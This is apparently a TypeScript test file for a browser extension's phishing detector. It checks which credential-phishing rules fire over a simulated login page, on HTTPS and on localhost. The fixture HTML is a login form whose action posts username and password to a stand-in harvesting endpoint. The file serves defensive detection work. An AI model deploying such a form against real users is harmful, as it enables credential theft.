/**
 * LIVE-PATH proof for the CRED family: runs the EXACT extension collection
 * functions (collectUrl / collectDomainRepresentation / collectTransport /
 * collectLoginInterface / collectScriptRuntime → assembleEvidence) over a
 * jsdom DOM, then the REAL engine (runAnalysisPass), and asserts which CRED
 * rules fire. No browser, no credentials, no network — fully deterministic.
 *
 * WHY THIS EXISTS. A live Chrome test on http://localhost:8000/ fired CRED-06
 * but not CRED-01/07, raising the question of whether the extension propagates
 * registrableDomain / actionRegistrableDomain correctly. This test settles it
 * at the same layer the browser exercises: the extension's own collectors feed
 * the real engine. It also proves the localhost result is CORRECT (a special-
 * use host has no registrable domain, so the cross-site predicate cannot
 * match) rather than a bug — and it guards the fix that wired the extension's
 * actionRegistrableDomain through the shared PSL (it was hardcoded null before,
 * which would have made CRED-01 unable to fire live on ANY domain).
 *
 * WHY tools/conformance: it imports BOTH the extension and the engine; the
 * dependency matrix forbids either package from importing the other, and this
 * neutral location may import both (same rationale as the loginInterface
 * conformance test).
 *
 * Run:
 *   node --experimental-strip-types tools/conformance/cred-live-path.test.ts
 */

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';

import {
  collectUrl, collectDomainRepresentation, collectTransport,
  collectLoginInterface, collectScriptRuntime,
} from '../../apps/extension/collect-evidence.ts';
import { assembleEvidence } from '../../apps/extension/assemble-evidence.ts';
import { runAnalysisPass } from '../../packages/engine/pass.ts';
import type { RuleSet } from '../../packages/contracts/ruleset.format.v1.ts';
import type { AuthStoreReader } from '../../packages/contracts/boundary.interfaces.v1.ts';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const ruleSet = JSON.parse(readFileSync(join(REPO, 'rulesets', 'rules-v0.1.0.json'), 'utf8')) as RuleSet;

// fingerprint is notCollected for every extension pass, so authContext is
// unevaluable BEFORE any store lookup — a throwing reader proves the store is
// never consulted (same guard confusion.ts uses).
const forbiddenStore: AuthStoreReader = {
  lookup: async () => { throw new Error('store must not be consulted'); },
};

// A real credential form posting OFF-ORIGIN. The action host is a different
// registrable domain than the page host. `.example` is RFC-2606 reserved and
// never resolves; nothing is submitted — the form is only inspected.
const LOGIN_HTML = `<!doctype html><html><body>
  <form method="POST" action="https://evil-collect.example/harvest">
    <input type="text" name="username" autocomplete="username">
    <input type="password" name="password" autocomplete="current-password">
    <button type="submit">Sign in</button>
  </form>
</body></html>`;

/** Drive the FULL extension collection path for a given page URL, then the
 *  engine. Mirrors content-script.ts's assembly exactly. */
async function livePass(pageUrl: string, html: string) {
  const dom = new JSDOM(html, { url: pageUrl });
  const parts = {
    url: collectUrl(pageUrl),
    domainRepresentation: collectDomainRepresentation(pageUrl),
    transport: collectTransport(new URL(pageUrl).protocol),
    loginInterface: collectLoginInterface(dom.window.document as unknown as ParentNode, dom.window.document.baseURI),
    scriptRuntime: collectScriptRuntime({ transmissionEndpoints: [], dynamicScriptOrigins: [] }),
  };
  const evidence = assembleEvidence(parts, pageUrl, '2026-08-31');
  const outcome = await runAnalysisPass(evidence, ruleSet, forbiddenStore, null);
  return { evidence, fired: outcome.findings.map((f) => f.ruleId), outcome };
}

/* ── Case A: valid off-origin login page (HTTPS) → CRED-01 MUST fire ──────── */
{
  const { evidence, fired } = await livePass('https://accounts.example.com/login', LOGIN_HTML);

  const url = evidence.evidence.url;
  const form = evidence.evidence.loginInterface.forms.state === 'present'
    ? evidence.evidence.loginInterface.forms.value[0] : undefined;

  // Prove the two domains the predicate compares are actually present and
  // derived by the shared PSL — the crux of the investigation.
  assert.equal(url.registrableDomain.state === 'present' ? url.registrableDomain.value : null, 'example.com',
    'page registrableDomain must be example.com (shared PSL)');
  assert.equal(form?.actionRegistrableDomain, 'evil-collect.example',
    'form actionRegistrableDomain must be evil-collect.example (shared PSL) — this is the field that was hardcoded null before the fix');

  assert.ok(fired.includes('CRED-01'),
    `CRED-01 MUST fire on a valid off-origin login page; fired = [${fired.join(', ')}]`);
  console.log(`  Case A (https://accounts.example.com, action evil-collect.example): fired [${fired.join(', ')}] — CRED-01 present ✓`);
}

/* ── Case B: the localhost caveat, proven CORRECT (not a bug) ─────────────── */
{
  const { evidence, fired } = await livePass('http://localhost:8000/', LOGIN_HTML);

  // localhost has NO registrable domain — the PSL returns null. url.registrableDomain
  // is `absent` (the producer looked; there genuinely is none), so CRED-01's
  // notSameSite(evil-collect.example, <null>) is a noMatch (stage2.ts, DEFECT-19).
  assert.equal(evidence.evidence.url.registrableDomain.state, 'absent',
    'localhost has no registrable domain -> absent, not present');
  assert.ok(!fired.includes('CRED-01'),
    'CRED-01 must NOT fire on localhost — no registrable domain to compare (correct, not a bug)');
  // But CRED-06 SHOULD fire: http:// is not a secure scheme, and it needs no
  // domain comparison. This is why the live localhost test showed CRED-06.
  assert.ok(fired.includes('CRED-06'),
    `CRED-06 must fire on an http login page; fired = [${fired.join(', ')}]`);
  console.log(`  Case B (http://localhost:8000): fired [${fired.join(', ')}] — CRED-01 correctly absent (no registrable domain), CRED-06 present ✓`);
}

console.log('CRED live-path PROVEN: through the real extension collectors + engine, CRED-01 fires on a '
  + 'valid off-origin login page and correctly does NOT fire on localhost (no registrable domain). '
  + 'actionRegistrableDomain is now derived via the shared PSL, not hardcoded null.');
